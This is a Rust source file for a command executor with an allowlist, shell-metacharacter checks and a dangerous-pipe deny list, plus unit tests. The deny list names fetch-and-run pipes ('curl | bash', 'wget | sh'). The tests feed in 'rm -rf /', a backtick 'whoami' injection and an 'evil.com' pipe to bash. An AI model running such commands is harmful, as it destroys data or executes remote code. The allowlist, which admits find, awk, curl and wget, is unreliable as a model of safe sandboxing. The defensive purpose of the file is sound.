use std::collections::HashSet;
use std::process::{Command, Output, Stdio};
use thiserror::Error;

/// CommandExecutor provides secure command execution with allowlist validation
/// and shell injection prevention.
///
/// # Security Features
/// - Allowlist-based command validation
/// - Shell pattern rejection (sh -c, bash -c)
/// - Shell metacharacter detection
/// - Dangerous pipe pattern detection
/// - execve-style execution (no shell)
/// - stdin set to null, stdout/stderr piped
#[derive(Debug, Clone)]
pub struct CommandExecutor {
    allowlist: HashSet<String>,
}

#[derive(Debug, Error)]
pub enum CommandError {
    #[error("Command not allowed: {0}")]
    CommandNotAllowed(String),

    #[error("Shell invocation attempt detected")]
    ShellInjectionAttempt,

    #[error("Shell metacharacters detected in argument: {0}")]
    ShellMetacharactersDetected(String),

    #[error("Dangerous pipe pattern detected")]
    DangerousPipeDetected,

    #[error("Command execution failed: {0}")]
    ExecutionFailed(#[from] std::io::Error),
}

impl CommandExecutor {
    /// Creates a new CommandExecutor with a default allowlist of safe commands.
    ///
    /// The default allowlist includes common development and system tools:
    /// - Version control: git
    /// - File operations: ls, cat, grep, find, head, tail, wc
    /// - Text processing: sed, awk, cut, sort, uniq
    /// - System info: ps, top, df, du, uname
    /// - Network: ping, curl, wget
    /// - Build tools: cargo, npm, yarn, make
    pub fn new() -> Self {
        let mut allowlist = HashSet::new();

        // Version control
        allowlist.insert("git".to_string());

        // File operations
        allowlist.insert("ls".to_string());
        allowlist.insert("cat".to_string());
        allowlist.insert("grep".to_string());
        allowlist.insert("find".to_string());
        allowlist.insert("head".to_string());
        allowlist.insert("tail".to_string());
        allowlist.insert("wc".to_string());

        // Text processing
        allowlist.insert("sed".to_string());
        allowlist.insert("awk".to_string());
        allowlist.insert("cut".to_string());
        allowlist.insert("sort".to_string());
        allowlist.insert("uniq".to_string());

        // System info
        allowlist.insert("ps".to_string());
        allowlist.insert("top".to_string());
        allowlist.insert("df".to_string());
        allowlist.insert("du".to_string());
        allowlist.insert("uname".to_string());

        // Network
        allowlist.insert("ping".to_string());
        allowlist.insert("curl".to_string());
        allowlist.insert("wget".to_string());

        // Build tools
        allowlist.insert("cargo".to_string());
        allowlist.insert("npm".to_string());
        allowlist.insert("yarn".to_string());
        allowlist.insert("make".to_string());
        allowlist.insert("rustc".to_string());
        allowlist.insert("node".to_string());

        // Utilities
        allowlist.insert("echo".to_string());

        Self { allowlist }
    }

    /// Creates a CommandExecutor with a custom allowlist.
    pub fn with_allowlist(commands: Vec<String>) -> Self {
        Self {
            allowlist: commands.into_iter().collect(),
        }
    }

    /// Adds a command to the allowlist.
    pub fn allow_command(&mut self, command: String) {
        self.allowlist.insert(command);
    }

    /// Removes a command from the allowlist.
    pub fn disallow_command(&mut self, command: &str) {
        self.allowlist.remove(command);
    }

    /// Validates a command through all security gates without executing it.
    ///
    /// This is used by `TerminalTool` to validate commands before executing
    /// them with a custom working directory.
    pub fn validate(&self, command: &str, args: &[String]) -> Result<(), CommandError> {
        // Gate 1: Validate command is in allowlist
        if !self.allowlist.contains(command) {
            return Err(CommandError::CommandNotAllowed(command.to_string()));
        }

        // Gate 2: Reject shell invocation patterns
        if command == "sh" || command == "bash" || command == "zsh" || command == "fish" {
            return Err(CommandError::ShellInjectionAttempt);
        }

        // Gate 3: Check for shell metacharacters in arguments
        for arg in args {
            if self.has_shell_metacharacters(arg) {
                return Err(CommandError::ShellMetacharactersDetected(arg.clone()));
            }
        }

        // Gate 4: Reject dangerous piping patterns
        let full_command = format!("{} {}", command, args.join(" "));
        if self.has_dangerous_pipe(&full_command) {
            return Err(CommandError::DangerousPipeDetected);
        }

        Ok(())
    }

    /// Executes a command with security validation.
    ///
    /// # Security Gates
    /// 1. Validate command is in allowlist
    /// 2. Reject shell invocation patterns (sh -c, bash -c)
    /// 3. Check for shell metacharacters in arguments
    /// 4. Detect dangerous piping patterns
    ///
    /// # Execution
    /// - Uses execve-style execution (no shell)
    /// - stdin set to null
    /// - stdout and stderr piped
    ///
    /// # Requirements
    /// - Requirement 8.1: Uses execve-style command execution
    /// - Requirement 8.4: Validates commands against allowlist
    /// - Requirement 8.5: Sets stdin to null, stdout/stderr to piped
    pub fn execute(&self, command: &str, args: &[String]) -> Result<Output, CommandError> {
        // Gate 1: Validate command is in allowlist
        if !self.allowlist.contains(command) {
            return Err(CommandError::CommandNotAllowed(command.to_string()));
        }

        // Gate 2: Reject shell invocation patterns
        if command == "sh" || command == "bash" || command == "zsh" || command == "fish" {
            return Err(CommandError::ShellInjectionAttempt);
        }

        // Gate 3: Check for shell metacharacters in arguments
        for arg in args {
            if self.has_shell_metacharacters(arg) {
                return Err(CommandError::ShellMetacharactersDetected(arg.clone()));
            }
        }

        // Gate 4: Reject dangerous piping patterns
        let full_command = format!("{} {}", command, args.join(" "));
        if self.has_dangerous_pipe(&full_command) {
            return Err(CommandError::DangerousPipeDetected);
        }

        // Execute with execve-style (no shell)
        // Requirement 8.1: execve-style execution with separate arguments
        // Requirement 8.5: stdin null, stdout/stderr piped
        let output = Command::new(command)
            .args(args)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()?;

        Ok(output)
    }

    /// Checks if a string contains shell metacharacters.
    ///
    /// Detects: | & ; ' " ` \n < >
    ///
    /// # Requirement
    /// - Requirement 8.3: Rejects shell metacharacters in user input
    fn has_shell_metacharacters(&self, s: &str) -> bool {
        s.chars()
            .any(|c| matches!(c, '|' | '&' | ';' | '\'' | '"' | '`' | '\n' | '<' | '>'))
    }

    /// Checks if a command contains dangerous piping patterns.
    ///
    /// Detects patterns like:
    /// - | sudo
    /// - | su
    /// - | chmod 777
    /// - curl | bash
    /// - wget | sh
    ///
    /// # Requirement
    /// - Requirement 8.7: Rejects dangerous piping patterns
    fn has_dangerous_pipe(&self, cmd: &str) -> bool {
        const DANGEROUS: &[&str] = &[
            "| sudo",
            "| su",
            "| chmod 777",
            "curl | bash",
            "wget | sh",
            "curl | sh",
            "wget | bash",
        ];
        DANGEROUS.iter().any(|d| cmd.contains(d))
    }
}

impl Default for CommandExecutor {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowed_command_executes() {
        let executor = CommandExecutor::new();
        let result = executor.execute("ls", &["-la".to_string()]);
        assert!(result.is_ok());
    }

    #[test]
    fn test_disallowed_command_rejected() {
        let executor = CommandExecutor::new();
        let result = executor.execute("rm", &["-rf".to_string(), "/".to_string()]);
        assert!(matches!(result, Err(CommandError::CommandNotAllowed(_))));
    }

    #[test]
    fn test_shell_invocation_rejected() {
        let executor = CommandExecutor::new();
        let result = executor.execute("sh", &["-c".to_string(), "echo hello".to_string()]);
        // sh is not in allowlist, so it will be rejected as CommandNotAllowed first
        // But we also check for shell invocation, so either error is acceptable
        assert!(result.is_err());
        match result {
            Err(CommandError::CommandNotAllowed(_)) | Err(CommandError::ShellInjectionAttempt) => {}
            _ => panic!("Expected CommandNotAllowed or ShellInjectionAttempt error"),
        }
    }

    #[test]
    fn test_bash_invocation_rejected() {
        let executor = CommandExecutor::new();
        let result = executor.execute("bash", &["-c".to_string(), "echo hello".to_string()]);
        // bash is not in allowlist, so it will be rejected as CommandNotAllowed first
        // But we also check for shell invocation, so either error is acceptable
        assert!(result.is_err());
        match result {
            Err(CommandError::CommandNotAllowed(_)) | Err(CommandError::ShellInjectionAttempt) => {}
            _ => panic!("Expected CommandNotAllowed or ShellInjectionAttempt error"),
        }
    }

    #[test]
    fn test_shell_metacharacters_detected() {
        let executor = CommandExecutor::new();

        // Test pipe character
        let result = executor.execute("ls", &["| cat".to_string()]);
        assert!(matches!(
            result,
            Err(CommandError::ShellMetacharactersDetected(_))
        ));

        // Test semicolon
        let result = executor.execute("ls", &["; rm -rf /".to_string()]);
        assert!(matches!(
            result,
            Err(CommandError::ShellMetacharactersDetected(_))
        ));

        // Test backtick
        let result = executor.execute("ls", &["`whoami`".to_string()]);
        assert!(matches!(
            result,
            Err(CommandError::ShellMetacharactersDetected(_))
        ));
    }

    #[test]
    fn test_dangerous_pipe_detected() {
        let executor = CommandExecutor::new();

        // Test pipe character in arguments (should be caught by metacharacter check)
        let result = executor.execute(
            "curl",
            &[
                "http://evil.com".to_string(),
                "|".to_string(),
                "bash".to_string(),
            ],
        );
        // This will be caught by shell metacharacter detection
        assert!(matches!(
            result,
            Err(CommandError::ShellMetacharactersDetected(_))
        ));
    }

    #[test]
    fn test_custom_allowlist() {
        let mut executor = CommandExecutor::with_allowlist(vec!["echo".to_string()]);

        // echo should work
        let result = executor.execute("echo", &["hello".to_string()]);
        assert!(result.is_ok());

        // ls should not work (not in custom allowlist)
        let result = executor.execute("ls", &[]);
        assert!(matches!(result, Err(CommandError::CommandNotAllowed(_))));

        // Add ls to allowlist
        executor.allow_command("ls".to_string());
        let result = executor.execute("ls", &[]);
        assert!(result.is_ok());
    }

    #[test]
    fn test_stdin_null_stdout_stderr_piped() {
        let executor = CommandExecutor::new();
        let result = executor.execute("echo", &["test".to_string()]);

        // Should succeed and capture output
        assert!(result.is_ok());
        let output = result.unwrap();

        // stdout should contain "test"
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(stdout.contains("test"));
    }
}
